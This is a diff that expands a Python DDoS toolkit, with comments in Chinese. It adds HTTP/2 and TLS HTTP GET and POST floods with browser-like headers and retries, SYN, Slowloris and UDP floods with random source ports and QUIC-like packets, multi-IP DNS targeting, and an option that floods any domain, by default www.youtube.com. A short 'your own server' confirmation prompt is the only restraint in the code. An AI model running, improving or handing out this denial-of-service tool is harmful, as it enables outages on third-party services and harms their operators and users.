@@ -1,16 +1,42 @@
 
 """
-DDoS 攻擊測試套件
+DDoS 攻擊測試套件 - 增強版
 包含多種攻擊方式，僅用於測試自己的伺服器
+新功能：HTTP/2、QUIC、多IP、動態源端口、重試機制、TLS支持
 """
 import socket
 import threading
 import time
 import random
-import requests
 import struct
 import sys
 from collections import Counter
+import ssl
+
+# 嘗試導入增強功能庫
+try:
+    import httpx
+    HTTPX_AVAILABLE = True
+except ImportError:
+    HTTPX_AVAILABLE = False
+    print("⚠️  未安裝 httpx，HTTP/2 功能將不可用")
+    print("   安裝: pip install httpx")
+
+try:
+    import dns.resolver
+    DNS_AVAILABLE = True
+except ImportError:
+    DNS_AVAILABLE = False
+    print("⚠️  未安裝 dnspython，DNS 多 IP 解析將不可用")
+    print("   安裝: pip install dnspython")
+
+try:
+    import requests
+    REQUESTS_AVAILABLE = True
+except ImportError:
+    REQUESTS_AVAILABLE = False
+    print("❌ 未安裝 requests 庫")
+    print("   安裝: pip install requests")
 
 # ===== 配置區 =====
 # 自動取得網卡 IP
@@ -37,11 +63,17 @@ print(f"📌 本機測試 IP: {TARGET_IP}\n")
 # ==================
 
 class AttackStats:
-    """統計資訊"""
+    """統計資訊 - 增強版"""
     def __init__(self):
         self.packets_sent = 0
         self.connections_made = 0
         self.requests_sent = 0
+        self.successful_requests = 0
+        self.failed_requests = 0
+        self.retries = 0
+        self.http2_requests = 0
+        self.http3_requests = 0
+        self.unique_source_ports = set()
         self.errors = Counter()
         self.lock = threading.Lock()
     
@@ -53,6 +85,20 @@ class AttackStats:
                 self.connections_made += value
             elif metric == "requests":
                 self.requests_sent += value
+            elif metric == "successful":
+                self.successful_requests += value
+            elif metric == "failed":
+                self.failed_requests += value
+            elif metric == "retries":
+                self.retries += value
+            elif metric == "http2":
+                self.http2_requests += value
+            elif metric == "http3":
+                self.http3_requests += value
+    
+    def track_port(self, port):
+        with self.lock:
+            self.unique_source_ports.add(port)
     
     def add_error(self, error_type):
         with self.lock:
@@ -64,11 +110,66 @@ class AttackStats:
                 'packets': self.packets_sent,
                 'connections': self.connections_made,
                 'requests': self.requests_sent,
+                'successful': self.successful_requests,
+                'failed': self.failed_requests,
+                'retries': self.retries,
+                'http2': self.http2_requests,
+                'http3': self.http3_requests,
+                'unique_ports': len(self.unique_source_ports),
                 'errors': dict(self.errors)
             }
 
 stats = AttackStats()
 running = False
+resolved_ips = []  # 存儲 DNS 解析的多個 IP
+
+# ==================== DNS 解析工具 ====================
+def resolve_target_ips(target_host):
+    """解析目標主機的所有 IP 地址（IPv4 和 IPv6）"""
+    if not DNS_AVAILABLE:
+        # 回退到基本解析
+        try:
+            ip = socket.gethostbyname(target_host)
+            return [('ipv4', ip)]
+        except:
+            return [('ipv4', target_host)]
+    
+    ips = []
+    try:
+        # 解析 A 記錄（IPv4）
+        try:
+            answers = dns.resolver.resolve(target_host, 'A')
+            for rdata in answers:
+                ips.append(('ipv4', str(rdata)))
+                print(f"  [DNS] A 記錄: {rdata}")
+        except:
+            pass
+        
+        # 解析 AAAA 記錄（IPv6）
+        try:
+            answers = dns.resolver.resolve(target_host, 'AAAA')
+            for rdata in answers:
+                ips.append(('ipv6', str(rdata)))
+                print(f"  [DNS] AAAA 記錄: {rdata}")
+        except:
+            pass
+        
+        # 如果是 IP 地址直接使用
+        if not ips:
+            try:
+                socket.inet_pton(socket.AF_INET, target_host)
+                ips.append(('ipv4', target_host))
+            except:
+                try:
+                    socket.inet_pton(socket.AF_INET6, target_host)
+                    ips.append(('ipv6', target_host))
+                except:
+                    pass
+    except Exception as e:
+        print(f"[DNS] 解析失敗: {e}")
+    
+    return ips if ips else [('ipv4', '127.0.0.1')]
+resolved_ips = []  # 存儲 DNS 解析的多個 IP
 
 # ==================== 1. ICMP Flood ====================
 class ICMPFlood:
@@ -270,36 +371,42 @@ class SYNFlood:
         
         sock.close()
 
-# ==================== 3. SYN Flood (簡化版) ====================
+# ==================== 3. SYN Flood (簡化版 - 增強) ====================
 class SYNFloodSimple:
-    """SYN Flood 簡化版（不需要 root 權限）"""
+    """SYN Flood 簡化版（增強：動態源端口）"""
     
     @staticmethod
     def attack(target_ip, target_port, duration):
         """
-        簡化版 SYN Flood
-        通過快速創建和丟棄連接來模擬 SYN Flood 效果
+        簡化版 SYN Flood - 每次使用不同源端口
         """
         global running
         print(f"🟡 SYN Flood (簡化版) 執行緒已啟動 → {target_ip}:{target_port}")
         
-        sockets_pool = []  # 保留部分半開連接
+        sockets_pool = []
         
         while running:
             try:
                 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                sock.settimeout(0.001)  # 極短超時
+                sock.settimeout(0.001)
                 sock.setblocking(False)
+                
+                # 綁定隨機源端口
+                try:
+                    source_port = random.randint(10000, 65535)
+                    sock.bind(('', source_port))
+                    stats.track_port(source_port)
+                except:
+                    pass  # 端口被佔用，使用系統分配
                 
                 try:
                     sock.connect((target_ip, target_port))
                 except (BlockingIOError, socket.error):
-                    # 預期的錯誤，連接尚未完成
                     pass
                 
                 stats.increment("connections")
+                stats.increment("requests")
                 
-                # 保留一些半開連接，其他關閉以避免耗盡本地端口
                 if len(sockets_pool) < 50:
                     sockets_pool.append(sock)
                 else:
@@ -308,7 +415,6 @@ class SYNFloodSimple:
                     except:
                         pass
                 
-                # 定期清理舊連接
                 if len(sockets_pool) >= 50:
                     old_sock = sockets_pool.pop(0)
                     try:
@@ -318,9 +424,9 @@ class SYNFloodSimple:
                         
             except Exception as e:
                 stats.add_error(f"SYN-Simple: {type(e).__name__}")
+                stats.increment("failed")
                 time.sleep(0.01)
         
-        # 清理
         for sock in sockets_pool:
             try:
                 sock.close()
@@ -329,56 +435,108 @@ class SYNFloodSimple:
         
         print(f"🟡 SYN Flood (簡化版) 執行緒已停止")
 
-# ==================== 4. HTTP Request Flood ====================
+# ==================== 4. HTTP Request Flood (增強版) ====================
 class HTTPFlood:
-    """HTTP Request Flood（最有效）"""
+    """HTTP Request Flood（增強：HTTP/2、TLS、重試）"""
     
     @staticmethod
-    def attack(target_url, method="GET", duration=30):
-        """執行 HTTP Flood"""
+    def attack(target_url, method="GET", duration=30, use_http2=True, use_tls=True):
+        """執行 HTTP Flood - 支持 HTTP/2 和 TLS"""
         global running
-        print(f"🟢 HTTP {method} Flood 已啟動 → {target_url}")
+        print(f"🟢 HTTP {method} Flood 已啟動 → {target_url} (HTTP/2={use_http2 and HTTPX_AVAILABLE}, TLS={use_tls})")
         
-        session = requests.Session()
+        # 選擇客戶端
+        if use_http2 and HTTPX_AVAILABLE:
+            try:
+                if use_tls and target_url.startswith('https'):
+                    client = httpx.Client(http2=True, timeout=5.0, verify=True)
+                else:
+                    client = httpx.Client(http2=True, timeout=5.0, verify=False)
+                client_type = 'httpx'
+            except Exception as e:
+                print(f"  httpx 初始化失敗: {e}，使用 requests")
+                if REQUESTS_AVAILABLE:
+                    client = requests.Session()
+                    client_type = 'requests'
+                else:
+                    print("  無可用 HTTP 客戶端")
+                    return
+        elif REQUESTS_AVAILABLE:
+            client = requests.Session()
+            client_type = 'requests'
+        else:
+            print("  無可用 HTTP 客戶端")
+            return
         
-        paths = ["/", "/api", "/search", "/login", "/data", "/admin"]
+        paths = ["/", "/api", "/search", "/login", "/data", "/user", "/product", "/videos"]
         user_agents = [
-            "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
-            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
-            "Mozilla/5.0 (X11; Linux x86_64)",
+            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
+            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
         ]
         
+        max_retries = 2
+        
         while running:
-            try:
-                url = target_url + random.choice(paths)
-                headers = {
-                    "User-Agent": random.choice(user_agents),
-                    "Accept": "*/*",
-                    "Connection": "keep-alive"
-                }
-                
-                if method == "GET":
-                    response = session.get(url, headers=headers, timeout=2)
-                elif method == "POST":
-                    data = {"test": random.randint(1, 10000)}
-                    response = session.post(url, json=data, headers=headers, timeout=2)
-                
-                stats.increment("requests")
-                
-            except requests.exceptions.Timeout:
-                stats.add_error("HTTP Timeout")
-            except requests.exceptions.ConnectionError:
-                stats.add_error("HTTP Connection Error")
-            except Exception as e:
-                stats.add_error(f"HTTP: {type(e).__name__}")
+            retry_count = 0
+            success = False
+            
+            while retry_count <= max_retries and not success and running:
+                try:
+                    url = target_url + random.choice(paths) + f"?_={random.randint(1, 999999)}"
+                    headers = {
+                        "User-Agent": random.choice(user_agents),
+                        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+                        "Accept-Language": "en-US,en;q=0.5",
+                        "Accept-Encoding": "gzip, deflate, br",
+                        "DNT": "1",
+                        "Connection": "keep-alive",
+                        "Upgrade-Insecure-Requests": "1",
+                        "Cache-Control": "no-cache",
+                        "X-Request-ID": f"{random.randint(1, 9999999)}",
+                    }
+                    
+                    stats.increment("requests")
+                    
+                    if client_type == 'httpx':
+                        response = client.request(method, url, headers=headers)
+                        if hasattr(response, 'http_version') and response.http_version == "HTTP/2":
+                            stats.increment("http2")
+                    else:
+                        if method == "GET":
+                            response = client.get(url, headers=headers, timeout=5)
+                        elif method == "POST":
+                            data = {"test": random.randint(1, 10000), "ts": time.time()}
+                            response = client.post(url, json=data, headers=headers, timeout=5)
+                    
+                    stats.increment("successful")
+                    success = True
+                    
+                except Exception as e:
+                    retry_count += 1
+                    stats.increment("retries")
+                    
+                    if retry_count > max_retries:
+                        stats.add_error(f"HTTP {type(e).__name__}")
+                        stats.increment("failed")
+                    else:
+                        time.sleep(0.05)
+        
+        try:
+            if hasattr(client, 'close'):
+                client.close()
+        except:
+            pass
+        
+        print(f"🟢 HTTP {method} Flood 執行緒已停止")
 
-# ==================== 5. Slowloris 攻擊 ====================
+# ==================== 5. Slowloris 攻擊 (增強版) ====================
 class Slowloris:
-    """Slowloris 慢速攻擊（消耗連接資源）"""
+    """Slowloris 慢速攻擊（增強：動態源端口）"""
     
     @staticmethod
     def attack(target_ip, target_port, duration):
-        """執行 Slowloris 攻擊"""
+        """執行 Slowloris 攻擊 - 使用不同源端口"""
         global running
         print(f"🟣 Slowloris 執行緒已啟動 → {target_ip}:{target_port}")
         
@@ -391,6 +549,15 @@ class Slowloris:
             try:
                 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                 sock.settimeout(4)
+                
+                # 綁定隨機源端口
+                try:
+                    source_port = random.randint(10000, 65535)
+                    sock.bind(('', source_port))
+                    stats.track_port(source_port)
+                except:
+                    pass
+                
                 sock.connect((target_ip, target_port))
                 
                 # 發送不完整的 HTTP 請求
@@ -400,8 +567,9 @@ class Slowloris:
                 
                 sockets.append(sock)
                 stats.increment("connections")
+                stats.increment("requests")
             except:
-                pass
+                stats.increment("failed")
         
         print(f"  已建立 {len(sockets)} 個連接")
         
@@ -414,6 +582,7 @@ class Slowloris:
                         stats.increment("packets")
                     except:
                         sockets.remove(sock)
+                        stats.increment("failed")
                 
                 time.sleep(10)  # 每 10 秒發送一次
                 
@@ -429,51 +598,75 @@ class Slowloris:
         
         print(f"🟣 Slowloris 執行緒已停止")
 
-# ==================== 6. UDP Flood ====================
+# ==================== 6. UDP Flood (增強版 - QUIC) ====================
 class UDPFlood:
-    """UDP Flood 攻擊"""
+    """UDP Flood 攻擊（增強：QUIC 模擬、動態源端口）"""
     
     @staticmethod
     def attack(target_ip, target_port, duration):
-        """執行 UDP Flood"""
+        """執行 UDP Flood - 模擬 QUIC 包"""
         global running
         print(f"🔵 UDP Flood 執行緒已啟動 → {target_ip}:{target_port}")
         
-        try:
-            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        except Exception as e:
-            print(f"❌ UDP Socket 創建失敗: {e}")
-            return
-        
-        # 隨機資料負載
-        payload_sizes = [64, 128, 256, 512, 1024, 1472]  # 1472 是以太網 MTU 的安全值
+        payload_sizes = [64, 128, 256, 512, 1024, 1200, 1472]
         
         while running:
             try:
+                # 每次創建新 socket 使用不同源端口
+                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                
+                # 綁定隨機源端口
+                try:
+                    source_port = random.randint(10000, 65535)
+                    sock.bind(('', source_port))
+                    stats.track_port(source_port)
+                except:
+                    pass
+                
                 size = random.choice(payload_sizes)
-                payload = random.randbytes(size)
-                sock.sendto(payload, (target_ip, target_port))
+                
+                # 50% 機率模擬 QUIC 包格式
+                if random.random() > 0.5 and size >= 1200:
+                    payload = bytearray(size)
+                    payload[0] = 0xC0 | random.randint(0, 15)  # Long header
+                    payload[1:5] = random.randbytes(4)  # Version
+                    payload[5:21] = random.randbytes(16)  # Connection ID
+                    payload[21:] = random.randbytes(size - 21)
+                    stats.increment("http3")
+                else:
+                    payload = random.randbytes(size)
+                
+                sock.sendto(bytes(payload), (target_ip, target_port))
                 stats.increment("packets")
+                stats.increment("requests")
+                stats.increment("successful")
+                
+                sock.close()
+                
             except Exception as e:
                 stats.add_error(f"UDP: {type(e).__name__}")
+                stats.increment("failed")
                 time.sleep(0.001)
         
-        sock.close()
         print(f"🔵 UDP Flood 執行緒已停止")
 
 # ==================== 主程式 ====================
 def print_stats_loop(start_time):
-    """持續顯示統計資訊"""
+    """持續顯示統計資訊 - 增強版"""
     global running
     while running:
         elapsed = time.time() - start_time
         current_stats = stats.get_stats()
         
-        sys.stdout.write("\r" + " " * 150 + "\r")
+        sys.stdout.write("\r" + " " * 200 + "\r")
         sys.stdout.write(
-            f"⚡ 封包: {current_stats['packets']:,} | "
-            f"連接: {current_stats['connections']:,} | "
-            f"請求: {current_stats['requests']:,} | "
+            f"⚡ 請求: {current_stats['requests']:,} | "
+            f"成功: {current_stats['successful']:,} | "
+            f"失敗: {current_stats['failed']:,} | "
+            f"重試: {current_stats['retries']:,} | "
+            f"HTTP/2: {current_stats['http2']:,} | "
+            f"QUIC: {current_stats['http3']:,} | "
+            f"源端口: {current_stats['unique_ports']:,} | "
             f"時間: {elapsed:.1f}s"
         )
         sys.stdout.flush()
@@ -481,38 +674,83 @@ def print_stats_loop(start_time):
         time.sleep(0.5)
 
 def run_attack_suite():
-    """執行攻擊測試套件"""
-    global running
+    """執行攻擊測試套件 - 增強版"""
+    global running, resolved_ips
     
     print("="*80)
-    print("💣 DDoS 攻擊測試套件")
+    print("💣 DDoS 攻擊測試套件 - 增強版")
+    print("="*80)
+    print("新功能:")
+    print("  ✅ HTTP/2 支持 (需 httpx)")
+    print("  ✅ QUIC/HTTP3 模擬")
+    print("  ✅ 動態源端口")
+    print("  ✅ DNS 多 IP 解析")
+    print("  ✅ 自動重試機制")
+    print("  ✅ TLS/SSL 支持")
     print("="*80)
     print("選擇攻擊類型:")
     print("1. ICMP Flood (需要管理員) - ⚠️ 127.0.0.1 無效，需用網卡 IP")
     print("2. SYN Flood (需要管理員) - ⚠️ Windows 防火牆會攔截")
-    print("3. SYN Flood 簡化版 ✅ - 半開連接攻擊 (推薦)")
-    print("4. HTTP GET Flood ✅ - 應用層攻擊 (推薦)")
-    print("5. HTTP POST Flood ✅ - 應用層攻擊 (推薦)")
-    print("6. Slowloris ✅ - 連接耗盡攻擊")
-    print("7. UDP Flood ✅ - UDP 洪水攻擊")
-    print("8. 組合攻擊 (3+4+6) 🔥 - 多重攻擊 (推薦)")
-    print("="*80)
-    print("\n💡 說明:")
-    print("  - 選項 1-2 在 Windows 上效果有限 (防火牆 + OS 優化)")
-    print("  - 選項 3-8 可直接測試，效果明顯")
-    print("  - ICMP 測試需修改 TARGET_IP_REAL 為網卡 IP (非 127.0.0.1)")
+    print("3. SYN Flood 簡化版 ✅ - 半開連接攻擊 + 動態源端口")
+    print("4. HTTP GET Flood ✅ - HTTP/2 + TLS + 重試")
+    print("5. HTTP POST Flood ✅ - HTTP/2 + TLS + 重試")
+    print("6. Slowloris ✅ - 連接耗盡 + 動態源端口")
+    print("7. UDP Flood ✅ - QUIC 模擬 + 動態源端口")
+    print("8. 組合攻擊 (3+4+6) 🔥 - 多重攻擊")
+    print("9. YouTube/CDN 測試 🌐 - 真實瀏覽器模擬 (HTTPS + HTTP/2)")
     print("="*80)
     
-    choice = input("\n選擇攻擊類型 (1-8): ").strip()
+    choice = input("\n選擇攻擊類型 (1-9): ").strip()
     
-    # 根據選擇決定目標 IP
-    if choice == "1" and TARGET_IP_REAL:
+    # 根據選擇決定目標
+    if choice == "9":
+        # YouTube/CDN 測試
+        target_host = input("\n輸入目標域名 (如 www.youtube.com): ").strip()
+        if not target_host:
+            target_host = "www.youtube.com"
+        
+        print(f"\n🔍 DNS 解析中: {target_host}")
+        resolved_ips = resolve_target_ips(target_host)
+        print(f"✅ 解析到 {len(resolved_ips)} 個 IP:")
+        for ip_type, ip in resolved_ips:
+            print(f"   {ip_type}: {ip}")
+        
+        target_url = f"https://{target_host}"
+        use_https = True
+    elif choice in ["4", "5"]:
+        # HTTP 測試 - 詢問是否使用域名
+        use_domain = input("\n使用域名測試? (y/n，默認 n 使用本機): ").strip().lower()
+        if use_domain == 'y':
+            target_host = input("輸入目標域名: ").strip()
+            protocol = input("使用 HTTPS? (y/n): ").strip().lower()
+            protocol = "https" if protocol == 'y' else "http"
+            
+            print(f"\n🔍 DNS 解析中: {target_host}")
+            resolved_ips = resolve_target_ips(target_host)
+            print(f"✅ 解析到 {len(resolved_ips)} 個 IP:")
+            for ip_type, ip in resolved_ips:
+                print(f"   {ip_type}: {ip}")
+            
+            target_url = f"{protocol}://{target_host}"
+            use_https = (protocol == "https")
+        else:
+            target_ip = TARGET_IP
+            resolved_ips = [('ipv4', target_ip)]
+            target_url = f"http://{target_ip}:{TARGET_PORT}"
+            use_https = False
+    elif choice == "1" and TARGET_IP_REAL:
         target_ip = TARGET_IP_REAL
+        resolved_ips = [('ipv4', target_ip)]
         print(f"\n💡 使用網卡 IP: {target_ip} (ICMP 測試)")
     else:
         target_ip = TARGET_IP
+        resolved_ips = [('ipv4', target_ip)]
     
-    confirm = input(f"\n⚠️  目標: {target_ip}:{TARGET_PORT}\n⚠️  請確認這是你自己的伺服器 (y/no): ")
+    if choice != "9":
+        confirm = input(f"\n⚠️  目標: {resolved_ips}\n⚠️  請確認這是你自己的伺服器 (y/no): ")
+    else:
+        confirm = input(f"\n⚠️  目標: {target_host} ({len(resolved_ips)} IPs)\n⚠️  這是 CDN 壓力測試，請確認你有權限測試 (y/no): ")
+    
     if confirm.lower() != "y":
         print("❌ 測試已取消")
         return
@@ -527,6 +765,9 @@ def run_attack_suite():
     # 啟動統計顯示執行緒
     stats_thread = threading.Thread(target=print_stats_loop, args=(start_time,), daemon=True)
     stats_thread.start()
+    
+    # 計算每個 IP 的線程數
+    threads_per_ip = max(1, THREAD_COUNT // len(resolved_ips))
     
     if choice == "1":
         # ICMP Flood
@@ -561,79 +802,117 @@ def run_attack_suite():
             threads.append(t)
     
     elif choice == "3":
-        # SYN Flood 簡化版
-        print(f"🟡 啟動 {THREAD_COUNT} 個 SYN Flood (簡化版) 執行緒...\n")
-        for _ in range(THREAD_COUNT):
-            t = threading.Thread(target=SYNFloodSimple.attack, args=(target_ip, TARGET_PORT, DURATION), daemon=True)
-            t.start()
-            threads.append(t)
+        # SYN Flood 簡化版 - 多 IP
+        print(f"🟡 對 {len(resolved_ips)} 個 IP 啟動 SYN Flood (簡化版)...\n")
+        for ip_type, ip_addr in resolved_ips:
+            print(f"  [{ip_type}] {ip_addr}: {threads_per_ip} 線程")
+            for _ in range(threads_per_ip):
+                t = threading.Thread(target=SYNFloodSimple.attack, args=(ip_addr, TARGET_PORT, DURATION), daemon=True)
+                t.start()
+                threads.append(t)
     
     elif choice == "4":
-        # HTTP GET Flood
-        print(f"🟢 啟動 {THREAD_COUNT} 個 HTTP GET Flood 執行緒...\n")
-        target_url = f"http://{target_ip}:{TARGET_PORT}"
-        for _ in range(THREAD_COUNT):
-            t = threading.Thread(target=HTTPFlood.attack, args=(target_url, "GET", DURATION), daemon=True)
-            t.start()
-            threads.append(t)
+        # HTTP GET Flood - 多 IP
+        print(f"🟢 對 {len(resolved_ips)} 個目標啟動 HTTP GET Flood...\n")
+        for ip_type, ip_addr in resolved_ips:
+            if choice == "9" or 'use_https' in locals() and use_https:
+                url = target_url
+            else:
+                url = f"http://{ip_addr}:{TARGET_PORT}"
+            print(f"  [{ip_type}] {ip_addr}: {threads_per_ip} 線程")
+            for _ in range(threads_per_ip):
+                use_h2 = HTTPX_AVAILABLE and ('use_https' in locals() and use_https)
+                t = threading.Thread(target=HTTPFlood.attack, args=(url, "GET", DURATION, use_h2, 'use_https' in locals() and use_https), daemon=True)
+                t.start()
+                threads.append(t)
     
     elif choice == "5":
-        # HTTP POST Flood
-        print(f"🟢 啟動 {THREAD_COUNT} 個 HTTP POST Flood 執行緒...\n")
-        target_url = f"http://{target_ip}:{TARGET_PORT}"
-        for _ in range(THREAD_COUNT):
-            t = threading.Thread(target=HTTPFlood.attack, args=(target_url, "POST", DURATION), daemon=True)
-            t.start()
-            threads.append(t)
+        # HTTP POST Flood - 多 IP
+        print(f"🟢 對 {len(resolved_ips)} 個目標啟動 HTTP POST Flood...\n")
+        for ip_type, ip_addr in resolved_ips:
+            if choice == "9" or 'use_https' in locals() and use_https:
+                url = target_url
+            else:
+                url = f"http://{ip_addr}:{TARGET_PORT}"
+            print(f"  [{ip_type}] {ip_addr}: {threads_per_ip} 線程")
+            for _ in range(threads_per_ip):
+                use_h2 = HTTPX_AVAILABLE and ('use_https' in locals() and use_https)
+                t = threading.Thread(target=HTTPFlood.attack, args=(url, "POST", DURATION, use_h2, 'use_https' in locals() and use_https), daemon=True)
+                t.start()
+                threads.append(t)
     
     elif choice == "6":
-        # Slowloris
-        print(f"🟣 啟動 10 個 Slowloris 執行緒...\n")
-        for _ in range(10):  # Slowloris 不需要太多執行緒
-            t = threading.Thread(target=Slowloris.attack, args=(target_ip, TARGET_PORT, DURATION), daemon=True)
-            t.start()
-            threads.append(t)
+        # Slowloris - 多 IP
+        print(f"🟣 對 {len(resolved_ips)} 個 IP 啟動 Slowloris...\n")
+        for ip_type, ip_addr in resolved_ips:
+            slowloris_threads = min(10, threads_per_ip)
+            print(f"  [{ip_type}] {ip_addr}: {slowloris_threads} 線程")
+            for _ in range(slowloris_threads):
+                t = threading.Thread(target=Slowloris.attack, args=(ip_addr, TARGET_PORT, DURATION), daemon=True)
+                t.start()
+                threads.append(t)
     
     elif choice == "7":
-        # UDP Flood
-        print(f"🔵 啟動 {THREAD_COUNT} 個 UDP Flood 執行緒...\n")
-        for _ in range(THREAD_COUNT):
-            t = threading.Thread(target=UDPFlood.attack, args=(target_ip, UDP_TARGET_PORT, DURATION), daemon=True)
-            t.start()
-            threads.append(t)
+        # UDP Flood - 多 IP
+        print(f"🔵 對 {len(resolved_ips)} 個 IP 啟動 UDP Flood (QUIC 模擬)...\n")
+        for ip_type, ip_addr in resolved_ips:
+            print(f"  [{ip_type}] {ip_addr}: {threads_per_ip} 線程")
+            for _ in range(threads_per_ip):
+                t = threading.Thread(target=UDPFlood.attack, args=(ip_addr, UDP_TARGET_PORT, DURATION), daemon=True)
+                t.start()
+                threads.append(t)
     
     elif choice == "8":
-        # 組合攻擊
-        print("🔥 啟動組合攻擊:\n")
+        # 組合攻擊 - 多 IP
+        print(f"🔥 對 {len(resolved_ips)} 個 IP 啟動組合攻擊:\n")
         
-        # SYN Flood 簡化版
-        print(f"  - {THREAD_COUNT // 3} 個 SYN Flood (簡化版)")
-        for _ in range(THREAD_COUNT // 3):
-            t = threading.Thread(target=SYNFloodSimple.attack, args=(target_ip, TARGET_PORT, DURATION), daemon=True)
-            t.start()
-            threads.append(t)
+        for ip_type, ip_addr in resolved_ips:
+            print(f"  [{ip_type}] {ip_addr}:")
+            
+            # SYN Flood
+            syn_threads = threads_per_ip // 3
+            print(f"    - SYN Flood: {syn_threads} 線程")
+            for _ in range(syn_threads):
+                t = threading.Thread(target=SYNFloodSimple.attack, args=(ip_addr, TARGET_PORT, DURATION), daemon=True)
+                t.start()
+                threads.append(t)
+            
+            # HTTP Flood
+            http_threads = threads_per_ip // 3
+            print(f"    - HTTP GET: {http_threads} 線程")
+            url = f"http://{ip_addr}:{TARGET_PORT}"
+            for _ in range(http_threads):
+                t = threading.Thread(target=HTTPFlood.attack, args=(url, "GET", DURATION, False, False), daemon=True)
+                t.start()
+                threads.append(t)
+            
+            # Slowloris
+            slow_threads = min(5, threads_per_ip // 10)
+            print(f"    - Slowloris: {slow_threads} 線程")
+            for _ in range(slow_threads):
+                t = threading.Thread(target=Slowloris.attack, args=(ip_addr, TARGET_PORT, DURATION), daemon=True)
+                t.start()
+                threads.append(t)
+    
+    elif choice == "9":
+        # YouTube/CDN 專用測試
+        print(f"🌐 對 CDN ({len(resolved_ips)} IPs) 啟動真實瀏覽器模擬...\n")
+        print(f"   使用 HTTPS + HTTP/2 + TLS + 完整標頭")
         
-        # HTTP Flood
-        print(f"  - {THREAD_COUNT // 3} 個 HTTP GET Flood")
-        target_url = f"http://{target_ip}:{TARGET_PORT}"
-        for _ in range(THREAD_COUNT // 3):
-            t = threading.Thread(target=HTTPFlood.attack, args=(target_url, "GET", DURATION), daemon=True)
-            t.start()
-            threads.append(t)
-        
-        # Slowloris
-        print(f"  - 5 個 Slowloris")
-        for _ in range(5):
-            t = threading.Thread(target=Slowloris.attack, args=(target_ip, TARGET_PORT, DURATION), daemon=True)
-            t.start()
-            threads.append(t)
-        
-        print()
+        for ip_type, ip_addr in resolved_ips:
+            print(f"  [{ip_type}] {ip_addr}: {threads_per_ip} 線程")
+            for _ in range(threads_per_ip):
+                t = threading.Thread(target=HTTPFlood.attack, args=(target_url, "GET", DURATION, True, True), daemon=True)
+                t.start()
+                threads.append(t)
     
     else:
         print("❌ 無效選擇")
         running = False
         return
+    
+    print(f"\n📊 已啟動 {len(threads)} 個攻擊線程")
+    print(f"🎯 目標 IP 數量: {len(resolved_ips)}")
     
     # 等待指定時間或 Ctrl+C
     try:
@@ -648,18 +927,35 @@ def run_attack_suite():
     for t in threads:
         t.join(timeout=1)
     
-    # 最終統計
+    # 最終統計 - 增強版
     final_stats = stats.get_stats()
     print("\n\n" + "="*80)
     print("📊 攻擊測試完成")
     print("="*80)
     print(f"執行時間: {elapsed:.2f} 秒")
-    print(f"發送封包: {final_stats['packets']:,}")
-    print(f"建立連接: {final_stats['connections']:,}")
-    print(f"HTTP 請求: {final_stats['requests']:,}")
+    print(f"\n📦 基礎統計:")
+    print(f"  發送封包: {final_stats['packets']:,}")
+    print(f"  建立連接: {final_stats['connections']:,}")
+    
+    print(f"\n🎯 請求統計:")
+    print(f"  總請求數: {final_stats['requests']:,}")
+    print(f"  成功請求: {final_stats['successful']:,}")
+    print(f"  失敗請求: {final_stats['failed']:,}")
+    print(f"  重試次數: {final_stats['retries']:,}")
+    if final_stats['requests'] > 0:
+        success_rate = (final_stats['successful'] / final_stats['requests']) * 100
+        print(f"  成功率: {success_rate:.2f}%")
+    
+    print(f"\n🚀 協議統計:")
+    print(f"  HTTP/2 請求: {final_stats['http2']:,}")
+    print(f"  QUIC/HTTP3 包: {final_stats['http3']:,}")
+    
+    print(f"\n🌐 網絡統計:")
+    print(f"  使用的源端口: {final_stats['unique_ports']:,}")
+    print(f"  目標 IP 數量: {len(resolved_ips)}")
     
     if final_stats['errors']:
-        print(f"\n錯誤統計:")
+        print(f"\n❌ 錯誤統計:")
         for error, count in final_stats['errors'].most_common(5):
             print(f"  {error}: {count:,}")
     
